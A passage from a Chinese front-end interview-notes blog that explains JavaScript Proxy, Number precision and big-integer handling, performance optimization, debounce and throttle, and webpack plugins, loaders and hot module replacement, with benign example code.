class="headerlink" title="40、proxy的使用"></a>40、proxy的使用</h3><p>在 JavaScript 中，<code>Proxy</code> 是一个构造函数，用于创建代理对象，以拦截并自定义目标对象的操作。<code>Proxy</code> 构造函数接受两个参数：</p><ol><li><p><strong>目标对象（Target）：</strong> 这是你希望创建代理的对象，代理对象会封装目标对象并拦截其操作。目标对象可以是任何普通 JavaScript 对象，包括数组、函数、自定义对象等。</p></li><li><p><strong>处理程序对象（Handler）：</strong> 处理程序对象是一个包含捕获器方法的对象，用于定义代理对象的行为。捕获器方法是一组特殊的函数，它们会在代理对象的操作上被调用，允许你自定义代理对象的行为。</p></li></ol><p>下面是一个示例，演示了如何使用 <code>Proxy</code> 构造函数创建一个简单的代理对象：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> target = &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;John&#x27;</span>,<br>  <span class="hljs-attr">age</span>: <span class="hljs-number">30</span>,<br>&#125;;<br><br><span class="hljs-keyword">const</span> handler = &#123;<br>  <span class="hljs-attr">get</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">target, prop</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Getting property &quot;<span class="hljs-subst">$&#123;prop&#125;</span>&quot;`</span>);<br>    <span class="hljs-keyword">return</span> target[prop];<br>  &#125;,<br>  <span class="hljs-attr">set</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">target, prop, value</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Setting property &quot;<span class="hljs-subst">$&#123;prop&#125;</span>&quot; to &quot;<span class="hljs-subst">$&#123;value&#125;</span>&quot;`</span>);<br>    target[prop] = value;<br>  &#125;,<br>&#125;;<br><br><span class="hljs-keyword">const</span> proxy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(target, handler);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(proxy.<span class="hljs-property">name</span>); <span class="hljs-comment">// 会触发捕获器方法 get，输出 &quot;Getting property &quot;name&quot;&quot;</span><br>proxy.<span class="hljs-property">age</span> = <span class="hljs-number">35</span>;          <span class="hljs-comment">// 会触发捕获器方法 set，输出 &quot;Setting property &quot;age&quot; to &quot;35&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>在上述示例中，<code>target</code> 是目标对象，<code>handler</code> 是处理程序对象，我们使用 <code>Proxy</code> 构造函数将它们传递给 <code>new Proxy</code>，从而创建了一个代理对象 <code>proxy</code>。代理对象拦截了对目标对象的访问和修改操作，并在捕获器方法中自定义了行为。</p><p>根据需要，你可以在 <code>handler</code> 对象中定义不同的捕获器方法，例如 <code>get</code>、<code>set</code>、<code>apply</code>、<code>construct</code> 等，来拦截不同类型的操作。这些捕获器方法接受一些参数，以便你在其中编写自定义的逻辑来处理代理对象的行为。</p><h3 id="41、Number多少位？如何解决大数据除了bigint？"><a href="#41、Number多少位？如何解决大数据除了bigint？" class="headerlink" title="41、Number多少位？如何解决大数据除了bigint？"></a>41、Number多少位？如何解决大数据除了bigint？</h3><p>在JavaScript中，<code>Number</code>类型用于表示数字。JavaScript中的<code>Number</code>类型遵循IEEE 754浮点数标准，通常使用64位双精度浮点数表示，即占用64位或8字节的内存。这意味着JavaScript中的<code>Number</code>可以表示的整数范围是有限的，最大安全整数（safe integer）是2^53 - 1，即9007199254740991。任何超出这个范围的整数都可能会丢失精度。</p><p>对于大整数，除了使用JavaScript的<code>BigInt</code>类型外，还可以考虑以下解决方法：</p><ol><li><p><strong>使用字符串表示：</strong> 对于非常大的整数，您可以将其表示为字符串，然后使用字符串操作来执行数字运算。这不会丢失精度，但需要额外的计算。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> bigNumberStr1 = <span class="hljs-string">&#x27;1234567890123456789012345678901234567890&#x27;</span>;<br><span class="hljs-keyword">const</span> bigNumberStr2 = <span class="hljs-string">&#x27;9876543210987654321098765432109876543210&#x27;</span>;<br><br><span class="hljs-keyword">const</span> result = <span class="hljs-title function_">addBigIntStrings</span>(bigNumberStr1, bigNumberStr2);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">addBigIntStrings</span>(<span class="hljs-params">a, b</span>) &#123;<br>    <span class="hljs-keyword">let</span> carry = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">let</span> result = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">let</span> maxLength = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(a.<span class="hljs-property">length</span>, b.<span class="hljs-property">length</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; maxLength; i++) &#123;<br>        <span class="hljs-keyword">const</span> digitA = <span class="hljs-built_in">parseInt</span>(a[a.<span class="hljs-property">length</span> - <span class="hljs-number">1</span> - i] || <span class="hljs-string">&#x27;0&#x27;</span>);<br>        <span class="hljs-keyword">const</span> digitB = <span class="hljs-built_in">parseInt</span>(b[b.<span class="hljs-property">length</span> - <span class="hljs-number">1</span> - i] || <span class="hljs-string">&#x27;0&#x27;</span>);<br>        <span class="hljs-keyword">const</span> sum = digitA + digitB + carry;<br>        carry = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(sum / <span class="hljs-number">10</span>);<br>        result = (sum % <span class="hljs-number">10</span>) + result;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (carry &gt; <span class="hljs-number">0</span>) &#123;<br>        result = carry + result;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>使用第三方库：</strong> 有一些第三方库可以处理大数学计算，如<code>big-integer</code>、<code>bignumber.js</code>等。这些库提供了高精度的整数运算功能。</p></li><li><p><strong>使用WebAssembly：</strong> 您可以使用WebAssembly编写高性能的C&#x2F;C++代码，以处理大数学计算，并将其嵌入到JavaScript中。</p></li><li><p><strong>分段计算：</strong> 对于非常大的整数，您可以将其分成多个小段进行计算，然后将结果组合在一起。这通常需要一些额外的编程工作。</p></li></ol><p>总的来说，处理大整数时，首选是使用JavaScript的<code>BigInt</code>类型，但如果有其他需求或限制，可以考虑使用上述方法之一来解决大数据问题。每种方法都有其优点和限制，具体的选择取决于项目的需求和复杂性。</p><h4 id="为什么bigInt可以表示这么大的数"><a href="#为什么bigInt可以表示这么大的数" class="headerlink" title="为什么bigInt可以表示这么大的数"></a>为什么bigInt可以表示这么大的数</h4><p><code>BigInt</code> 可以表示如此大的整数，主要是因为它的数据类型设计与常规的 <code>Number</code> 类型不同。这是由以下几个因素造成的：</p><ol><li><p><strong>不受固定位数限制：</strong> JavaScript 中的常规 <code>Number</code> 类型使用了双精度浮点数表示，它有一定的位数限制。最大安全整数是 2^53 - 1，超过这个范围的整数将丢失精度。而 <code>BigInt</code> 不受这个位数限制，它可以根据需要分配更多的位数以表示极大的整数。</p></li><li><p><strong>动态位数分配：</strong> <code>BigInt</code> 内部采用动态位数分配的方式，即根据实际需要动态分配足够的位数来存储整数。这意味着 <code>BigInt</code> 可以适应非常大的整数而不会丢失精度，但这也会占用更多的内存。</p></li><li><p><strong>精确整数计算：</strong> <code>BigInt</code> 的设计目标是支持精确的整数计算，而不会受到 JavaScript 浮点数的精度限制。这对于需要处理大整数的应用非常重要，如密码学、货币计算、大型整数的数值分析等领域。</p></li></ol><p>总之，<code>BigInt</code> 通过动态分配足够的位数来表示整数，不受固定位数限制，因此可以表示非常大的整数。这使得 JavaScript 在处理大整数时更加灵活和精确。但请注意，由于 <code>BigInt</code> 占用更多内存，因此在使用时需要谨慎考虑性能和内存消耗。</p><h2 id="常用框架及优化篇"><a href="#常用框架及优化篇" class="headerlink" title="常用框架及优化篇"></a>常用框架及优化篇</h2><h3 id="x3D-x3D-1、性能优化手段-x3D-x3D"><a href="#x3D-x3D-1、性能优化手段-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;1、性能优化手段&#x3D;&#x3D;"></a>&#x3D;&#x3D;1、性能优化手段&#x3D;&#x3D;</h3><p>前端性能优化是确保网页在加载和交互方面具有良好性能的重要任务，这可以提高用户体验、减少跳失率，并有助于提高网站的排名。以下是一些前端性能优化的常见手段和最佳实践：</p><ol><li><p><strong>减少HTTP请求：</strong> 减少网页上的HTTP请求是提高性能的关键因素之一。合并和压缩CSS和JavaScript文件，减少图像数量，使用CSS Sprites（雪碧图）等方法可以帮助减少请求次数。</p></li><li><p><strong>使用浏览器缓存：</strong> 利用浏览器缓存来存储资源，例如CSS、JavaScript、图像和字体，以减少每次访问时的下载时间。使用适当的缓存控制头（如<code>Cache-Control</code>和<code>Expires</code>）来管理缓存。</p></li><li><p><strong>延迟加载（Lazy Loading）：</strong> 将页面上不是立即需要的资源（如图片或JavaScript）推迟到需要时再加载。这可以减少初始页面加载时间。</p></li><li><p><strong>使用CDN（内容分发网络）：</strong> 使用CDN来分发静态资源，以便更快速地将资源提供给用户，并减少服务器负载。</p></li><li><p><strong>优化图片：</strong> 使用适当的图像格式（如WebP、JPEG、PNG）和压缩工具来减小图像文件的大小。还可以使用响应式图像技术，根据设备的屏幕尺寸提供适当大小的图像。</p></li><li><p><strong>使用字体图标：</strong> 使用字体图标或SVG图标替代图像，以减少页面加载时间并提高分辨率无关性能。</p></li><li><p><strong>异步加载资源：</strong> 使用<code>async</code>或<code>defer</code>属性来异步加载JavaScript文件，以避免阻塞页面渲染。</p></li><li><p><strong>压缩代码：</strong> 使用JavaScript和CSS压缩工具来减小文件大小。这可以减少传输时间和加载时间。</p></li><li><p><strong>减少DOM操作：</strong> 减少频繁的DOM操作，因为DOM操作通常比其他操作更昂贵。尽量使用批处理操作来优化性能。</p></li><li><p><strong>使用现代Web技术：</strong> 使用现代的Web技术，如Service Workers、Web Workers、HTTP&#x2F;2等，以提高性能和响应速度。</p></li><li><p><strong>响应式设计：</strong> 使用响应式设计技术，以确保网站在各种设备和屏幕尺寸上都能提供最佳的用户体验。</p></li><li><p><strong>优化第三方库和插件：</strong> 仔细评估和选择第三方库和插件，并确保它们不会成为性能瓶颈。定期更新和监控这些库的性能。</p></li><li><p><strong>测量和监控性能：</strong> 使用工具如Google PageSpeed Insights、Lighthouse、WebPageTest等来测量和监控网站的性能，并及时解决问题。</p></li><li><p><strong>减少重定向和错误：</strong> 避免使用不必要的URL重定向，修复404错误，以确保用户不会遇到不必要的延迟。</p></li><li><p><strong>代码分割和按需加载：</strong> 使用现代构建工具（如Webpack）来实现代码分割和按需加载，以减小初始加载的资源大小。</p></li></ol><p>综合使用这些前端性能优化手段可以显著提高网站的加载速度和用户体验。然而，请注意，性能优化是一个不断迭代和改进的过程，需要根据具体的应用程序需求和情况来制定最佳的优化策略。</p><h5 id="防抖节流可以用到的场景"><a href="#防抖节流可以用到的场景" class="headerlink" title="防抖节流可以用到的场景"></a>防抖节流可以用到的场景</h5><p>防抖（Debouncing）和节流（Throttling）是用于控制函数触发频率的两种常见技术，它们在很多前端开发场景中都非常有用。以下是一些适合使用防抖和节流的常见场景：</p><p><strong>防抖（Debouncing）：</strong></p><ol><li><p><strong>输入框搜索：</strong> 当用户在搜索框中输入关键字时，防抖可以用于延迟发送搜索请求，以减少请求的数量。只有在用户停止输入一段时间后才执行搜索请求，避免频繁的搜索。</p></li><li><p><strong>窗口调整大小：</strong> 当窗口大小发生变化时，可以使用防抖来确保只在用户停止调整窗口大小后执行相关操作，以提高性能。</p></li><li><p><strong>滚动事件：</strong> 当用户滚动页面时，防抖可以用于延迟触发滚动事件处理程序，以减少处理滚动事件的频率，尤其是在处理复杂的动画或操作时。</p></li><li><p><strong>提交表单：</strong> 防抖可以用于延迟表单提交，确保用户在连续点击提交按钮时不会多次触发表单提交操作。</p></li></ol><p><strong>节流（Throttling）：</strong></p><ol><li><p><strong>限制函数调用频率：</strong> 节流可以用于限制某个函数的调用频率，例如，每隔一定时间执行一次函数，以防止函数被频繁触发。</p></li><li><p><strong>点击事件：</strong> 在处理按钮点击事件时，可以使用节流来确保用户点击按钮后只触发一次操作，而不管用户点击速度有多快。</p></li><li><p><strong>鼠标移动事件：</strong> 当处理鼠标移动事件时，节流可以用于减少事件处理的频率，以提高性能和响应速度。</p></li><li><p><strong>页面滚动加载：</strong> 在实现滚动加载更多内容的功能时，节流可以用于限制滚动事件的触发频率，从而减少请求次数。</p></li><li><p><strong>网络请求限制：</strong> 节流可以用于限制网络请求的发送频率，以防止过多的请求同时发送到服务器。</p></li></ol><p>总的来说，防抖和节流是用于优化性能和提高用户体验的常见技术，它们可以在各种交互和事件处理场景中发挥作用，确保函数不被过度触发，同时又能保持及时的响应性。根据具体的需求和场景，选择合适的技术来控制函数的触发频率非常重要。</p><h3 id="2、对webpack的理解"><a href="#2、对webpack的理解" class="headerlink" title="2、对webpack的理解"></a>2、对webpack的理解</h3><p>Webpack（通常简称为Webpack）是一个现代的 JavaScript 应用程序的静态模块打包工具。它是前端开发中非常常用的工具之一，用于将多个模块（包括 JavaScript、样式、图像等）打包成一个或多个最终的资源文件，以用于网页加载。以下是对Webpack的理解：</p><ol><li><p><strong>模块打包：</strong> Webpack的主要功能之一是将应用程序中的多个模块打包成一个或多个捆绑包（bundle）。这有助于减少HTTP请求的数量，提高网页加载速度，并简化了开发工作流程。</p></li><li><p><strong>依赖管理：</strong> Webpack能够识别模块之间的依赖关系，并自动解析和加载这些依赖。这使得开发者可以轻松地导入其他模块，而无需手动管理依赖路径。</p></li><li><p><strong>加载器（Loaders）：</strong> Webpack可以使用加载器处理非JavaScript文件，例如样式表、图像、字体等。开发者可以编写自定义加载器，或使用现有的加载器，以便在打包过程中对这些文件进行转换和处理。</p></li><li><p><strong>插件（Plugins）：</strong> Webpack的插件系统允许开发者在打包过程中执行各种自定义任务，例如代码压缩、代码分离、资源优化等。有许多社区维护的插件可供选择，或者可以编写自定义插件以满足特定需求。</p></li><li><p><strong>开发服务器（Development Server）：</strong> Webpack附带一个开发服务器，可以在开发过程中自动重新构建应用程序，并支持热模块替换（Hot Module Replacement，HMR），以实现在不刷新整个页面的情况下实时更新修改。</p></li><li><p><strong>代码分离（Code Splitting）：</strong> Webpack支持将应用程序拆分成多个块，以按需加载。这有助于减小初始加载时的文件大小，提高应用程序的性能。</p></li><li><p><strong>环境配置（Environment Configuration）：</strong> Webpack可以根据开发环境和生产环境的不同，自动配置不同的打包规则和插件。这使得开发者可以为不同的环境优化应用程序。</p></li><li><p><strong>生态系统：</strong> Webpack拥有广泛的社区支持和丰富的生态系统，有大量的插件和加载器可供使用，以及丰富的文档和教程资源。</p></li></ol><h5 id="核心概念"><a href="#核心概念" class="headerlink" title="核心概念"></a>核心概念</h5><p>Webpack 是一个用于打包前端项目的强大工具，其中有一些核心概念需要理解：</p><ol><li><p><strong>Module（模块）：</strong> 在Webpack中，一切皆为模块。JavaScript 文件、CSS 文件、图片等等都可以被视为模块。Webpack 将所有这些模块视为一个个独立的单元，可以进行打包和管理。</p></li><li><p><strong>Loader（加载器）：</strong> Loader 是用于处理不同类型文件的扩展模块，它们允许你在导入模块时预处理文件。例如，<code>babel-loader</code> 可以将 ES6&#x2F;ES7 代码转换成 ES5，<code>css-loader</code> 可以处理 CSS 文件。</p></li><li><p><strong>Plugin（插件）：</strong> 插件用于执行各种任务，从打包优化和压缩，到重新定义环境变量等。常用的插件包括 <code>HtmlWebpackPlugin</code> 用于生成 HTML 文件，<code>UglifyJsPlugin</code> 用于压缩 JavaScript 代码等。</p></li><li><p><strong>Entry（入口）：</strong> 入口是 Webpack 构建的起点。它指定了从哪个模块开始构建内部依赖图。通常，一个应用程序有一个主入口文件，但也可以有多个入口，例如用于拆分代码的多页应用。</p></li><li><p><strong>Output（输出）：</strong> 输出决定了 Webpack 打包后的文件应该存储在何处以及如何命名。你可以配置输出的文件名、路径和公共路径等。</p></li></ol><p>下面是一个简单的 Webpack 配置示例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">entry</span>: <span class="hljs-string">&#x27;./src/index.js&#x27;</span>, <span class="hljs-comment">// 入口文件</span><br>  <span class="hljs-attr">output</span>: &#123;<br>    <span class="hljs-attr">path</span>: path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">&#x27;dist&#x27;</span>), <span class="hljs-comment">// 输出目录</span><br>    <span class="hljs-attr">filename</span>: <span class="hljs-string">&#x27;bundle.js&#x27;</span> <span class="hljs-comment">// 输出文件名</span><br>  &#125;,<br>  <span class="hljs-attr">module</span>: &#123;<br>    <span class="hljs-attr">rules</span>: [<br>      &#123;<br>        <span class="hljs-attr">test</span>: <span class="hljs-regexp">/\.js$/</span>, <span class="hljs-comment">// 匹配以.js结尾的文件</span><br>        <span class="hljs-attr">exclude</span>: <span class="hljs-regexp">/node_modules/</span>, <span class="hljs-comment">// 排除 node_modules 目录</span><br>        <span class="hljs-attr">use</span>: &#123;<br>          <span class="hljs-attr">loader</span>: <span class="hljs-string">&#x27;babel-loader&#x27;</span> <span class="hljs-comment">// 使用 babel-loader 处理</span><br>        &#125;<br>      &#125;,<br>      &#123;<br>        <span class="hljs-attr">test</span>: <span class="hljs-regexp">/\.css$/</span>, <span class="hljs-comment">// 匹配以.css结尾的文件</span><br>        <span class="hljs-attr">use</span>: [<span class="hljs-string">&#x27;style-loader&#x27;</span>, <span class="hljs-string">&#x27;css-loader&#x27;</span>] <span class="hljs-comment">// 先使用 css-loader 处理，再使用 style-loader 处理</span><br>      &#125;<br>    ]<br>  &#125;,<br>  <span class="hljs-attr">plugins</span>: [<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">HtmlWebpackPlugin</span>(&#123;<br>      <span class="hljs-attr">template</span>: <span class="hljs-string">&#x27;./src/index.html&#x27;</span> <span class="hljs-comment">// 使用 HtmlWebpackPlugin 生成 HTML 文件</span><br>    &#125;)<br>  ]<br>&#125;;<br></code></pre></td></tr></table></figure><p>这只是 Webpack 配置的一个基本示例，Webpack 还有许多其他功能和配置选项，可以根据项目需求进行扩展和优化。总之，Webpack是一个强大的前端构建工具，它提供了许多功能来简化和优化前端开发流程。通过将模块打包成捆绑包、管理依赖、处理非JavaScript文件、自动化任务等，Webpack有助于提高开发效率和应用程序性能。因此，它已成为现代前端开发的标准工具之一。</p><h5 id="webpack的工作流程"><a href="#webpack的工作流程" class="headerlink" title="webpack的工作流程"></a>webpack的工作流程</h5><p>Webpack 的工作流程可以简单概括为以下几个步骤：</p><ol><li><strong>入口起点（Entry Point）：</strong> Webpack 从一个或多个入口起点开始构建应用程序的依赖关系图。入口起点是指定的文件（例如 JavaScript 文件），Webpack 从这些文件开始分析和处理依赖关系。</li><li><strong>依赖分析（Dependency Resolution）：</strong> 在分析入口文件后，Webpack 会递归地查找和分析依赖文件。这包括 JavaScript 文件中的 <code>import</code>、<code>require</code>，CSS 文件中的 <code>@import</code>，图片文件中的 <code>url()</code> 等。Webpack 将这些依赖关系建立成一个依赖图（Dependency Graph）。</li><li><strong>加载器处理（Loader）：</strong> 在分析依赖关系时，Webpack 遇到不同类型的文件，需要使用适当的加载器来处理这些文件。加载器允许你在导入模块时预处理文件，例如将 ES6 转换为 ES5、将 SCSS 转换为 CSS 等。加载器将文件转换为模块，以便后续处理。</li><li><strong>插件应用（Plugins）：</strong> Webpack 插件用于执行各种构建和优化任务。插件可以用于生成 HTML 文件、压缩代码、分离 CSS、定义环境变量等。插件可以在 Webpack 构建过程的不同阶段执行自定义任务。</li><li><strong>输出（Output）：</strong> Webpack 会将构建后的模块打包成一个或多个输出文件，这些输出文件包括 JavaScript 文件、CSS 文件、图片文件等。输出文件的配置由 Webpack 配置中的 <code>output</code> 字段定义。通常情况下，Webpack 会生成一个或多个 JavaScript 文件，其中一个是入口文件，其余是按需加载的模块。</li><li><strong>开发服务器（Development Server）：</strong> 在开发过程中，可以使用 Webpack Dev Server 等开发服务器来提供本地开发环境。开发服务器具有热模块替换（Hot Module Replacement，HMR）功能，可以在不刷新页面的情况下更新代码。</li><li><strong>生产构建（Production Build）：</strong> 在生产环境中，通常会运行 Webpack 的生产构建，这会执行代码压缩、优化、分割、提取公共代码等操作，以减小输出文件的大小并提高性能。</li><li><strong>部署应用程序：</strong> 最终生成的输出文件可以被部署到 Web 服务器上，以供用户访问。部署可以使用传统的服务器托管、云服务或内容分发网络（CDN）等方式进行。</li></ol><h5 id="webpack中plugin和常见的plugin"><a href="#webpack中plugin和常见的plugin" class="headerlink" title="webpack中plugin和常见的plugin"></a>webpack中plugin和常见的plugin</h5><p>在 Webpack 中，插件（Plugins）是用来扩展和定制构建过程的工具，它们可以执行各种任务，从优化代码到资源管理。以下是一些常见的 Webpack 插件以及它们的作用：</p><ol><li><p><strong>HtmlWebpackPlugin：</strong> 用于生成 HTML 文件，并自动引入打包后的 JavaScript 和 CSS 文件，可配置模板、压缩等选项。</p></li><li><p><strong>CleanWebpackPlugin：</strong> 在每次构建前清理输出目录，以确保构建输出是干净的。</p></li><li><p><strong>MiniCssExtractPlugin：</strong> 用于将 CSS 提取为独立的文件，适用于生产环境的 CSS 分离。</p></li><li><p><strong>OptimizeCSSAssetsWebpackPlugin：</strong> 用于优化和压缩 CSS 文件，通常与 <code>MiniCssExtractPlugin</code> 一起使用。</p></li><li><p><strong>CopyWebpackPlugin：</strong> 用于复制静态文件或目录到输出目录，如图片、字体等。</p></li><li><p><strong>DefinePlugin：</strong> 用于定义全局变量，可在代码中访问，常用于配置环境变量。</p></li><li><p><strong>ProvidePlugin：</strong> 自动加载模块，使模块中的变量可在全局范围内使用，例如自动引入 jQuery。</p></li><li><p><strong>HotModuleReplacementPlugin：</strong> 启用热模块替换（HMR），使在开发模式下代码修改后无需刷新浏览器即可看到变化。</p></li><li><p><strong>SplitChunksPlugin：</strong> 用于代码分割，将公共模块提取为独立的文件，提高构建速度和缓存利用。</p></li><li><p><strong>WebpackBar：</strong> 一个构建进度条插件，用于显示构建进度，更直观地查看构建状态。</p></li><li><p><strong>CompressionWebpackPlugin：</strong> 用于压缩构建输出，减小文件体积，提高加载速度，通常用于生产环境。</p></li><li><p><strong>FriendlyErrorsWebpackPlugin：</strong> 使 Webpack 构建错误信息更友好地显示在终端上，方便开发者调试。</p></li><li><p><strong>ESLintPlugin：</strong> 用于集成 ESLint，实现代码规范检查，保证代码质量。</p></li><li><p><strong>StylelintPlugin：</strong> 用于集成 Stylelint，实现样式文件的代码规范检查。</p></li><li><p><strong>HardSourceWebpackPlugin：</strong> 用于提高二次构建速度，通过缓存构建结果来减少重复构建。</p></li></ol><p>这些是一些常见的 Webpack 插件，它们可以根据项目的需求和场景选择性地配置和使用。通过合理使用插件，可以实现代码优化、资源管理、性能提升等各种功能，从而更高效地构建前端应用。</p><h5 id="webpack中css-loader-style-loader-scss-leader的各自作用和执行顺序"><a href="#webpack中css-loader-style-loader-scss-leader的各自作用和执行顺序" class="headerlink" title="webpack中css-loader,style-loader,scss-leader的各自作用和执行顺序"></a>webpack中css-loader,style-loader,scss-leader的各自作用和执行顺序</h5><p>在 Webpack 中，<code>css-loader</code>、<code>style-loader</code> 和 <code>scss-loader</code> 是用于处理样式文件的常用加载器。它们各自的作用和执行顺序如下：</p><ol><li><p><strong>css-loader：</strong></p><ul><li><code>css-loader</code> 用于处理 CSS 文件，将 CSS 文件转换为一个模块，使其能够被 JavaScript 引入。</li><li>它主要负责解析 CSS 文件中的 <code>@import</code> 和 <code>url()</code> 引用，并处理它们的依赖关系。</li><li>执行顺序：在 Webpack 配置中，<code>css-loader</code> 通常会被配置在最后，以确保其他加载器（如 <code>sass-loader</code> 或 <code>postcss-loader</code>）可以在样式文件经过处理后再由 <code>css-loader</code> 处理。</li></ul></li><li><p><strong>style-loader：</strong></p><ul><li><code>style-loader</code> 用于将 CSS 模块注入到 HTML 中的 <code>&lt;style&gt;</code> 标签内，以使样式生效。</li><li>它将样式模块的内容以内联的方式插入到 HTML 中，或者将样式以链接的方式生成外部 CSS 文件。</li><li>执行顺序：通常会在 <code>css-loader</code> 之前配置，以确保样式模块被加载后能够注入到页面中。</li></ul></li><li><p><strong>scss-loader（或 sass-loader）：</strong></p><ul><li><code>scss-loader</code>（或 <code>sass-loader</code>）用于处理 SCSS 或 Sass 文件，将其编译成纯 CSS。</li><li>它依赖于 <code>node-sass</code> 或 <code>dart-sass</code> 等编译器来将 SCSS&#x2F;Sass 转化为 CSS。</li><li>执行顺序：通常会在 <code>css-loader</code> 和 <code>style-loader</code> 之前配置，以确保在样式文件编译为 CSS 后，再由 <code>css-loader</code> 处理成 CSS 模块，最后通过 <code>style-loader</code> 注入到页面中。</li></ul></li></ol><p>执行顺序是非常重要的，通常在 Webpack 配置中，加载器的顺序会从右到左（或从下到上）应用于模块。例如，处理 SCSS 样式的配置可能如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-attr">module</span>: &#123;<br>  <span class="hljs-attr">rules</span>: [<br>    &#123;<br>      <span class="hljs-attr">test</span>: <span class="hljs-regexp">/\.scss$/</span>,<br>      <span class="hljs-attr">use</span>: [<br>        <span class="hljs-string">&#x27;style-loader&#x27;</span>,   <span class="hljs-comment">// 将样式注入到页面</span><br>        <span class="hljs-string">&#x27;css-loader&#x27;</span>,     <span class="hljs-comment">// 处理 CSS 模块</span><br>        <span class="hljs-string">&#x27;sass-loader&#x27;</span>     <span class="hljs-comment">// 编译 SCSS 成 CSS</span><br>      ]<br>    &#125;<br>  ]<br>&#125;<br></code></pre></td></tr></table></figure><p>这个配置会先由 <code>sass-loader</code> 处理 SCSS 文件，然后由 <code>css-loader</code> 处理成 CSS 模块，最后由 <code>style-loader</code> 将样式注入到页面中。这是一个常见的样式加载器配置，但具体的配置可能因项目需求而异。</p><h5 id="webpack中热更新原理"><a href="#webpack中热更新原理" class="headerlink" title="webpack中热更新原理"></a>webpack中热更新原理</h5><p>Webpack 的热更新（Hot Module Replacement，HMR）是一项非常有用的功能，它允许在开发过程中无需刷新整个页面即可实时更新代码。这个功能通过以下原理来实现：</p><ol><li><p><strong>模块标识（Module ID）：</strong> 在启用 HMR 时，Webpack 会为每个模块分配一个唯一的标识符（Module ID）。这个标识符在模块发生变化时保持不变，即使代码发生变化。</p></li><li><p><strong>热替换运行时（Hot Replacement Runtime）：</strong> Webpack 内置了一个运行时环境，它负责管理模块的热替换。这个运行时环境在启动时会记录当前模块的版本号和依赖关系。</p></li><li><p><strong>监视文件变化：</strong> Webpack 会监视项目中的文件变化，包括源代码文件和依赖模块。</p></li><li><p><strong>模块替换（Module Replacement）：</strong> 当一个文件发生变化时，Webpack 会通知热替换运行时，然后它会与当前运行中的应用程序进行通信。</p></li><li><p><strong>更新处理（Update Handling）：</strong> 热替换运行时会与新模块进行比较，找出哪些模块发生了变化。</p></li><li><p><strong>应用更新（Apply Updates）：</strong> 一旦确定了哪些模块需要更新，热替换运行时会尝试替换这些模块。如果替换成功，应用程序的状态会保持不变，但新代码已经在运行中。</p></li><li><p><strong>触发回调（Trigger Callbacks）：</strong> 一旦更新成功，Webpack 会触发回调函数，开发者可以在这些回调中执行一些自定义逻辑，如更新 UI 界面。</p></li></ol><p>总的来说，Webpack 的热更新通过在运行时管理模块的替换，使得在开发过程中可以实时应用代码变化而不需要刷新整个页面。这大大提高了开发效率，特别是在大型项目中。要启用热更新，通常需要在 Webpack 配置中添加相应的插件（如 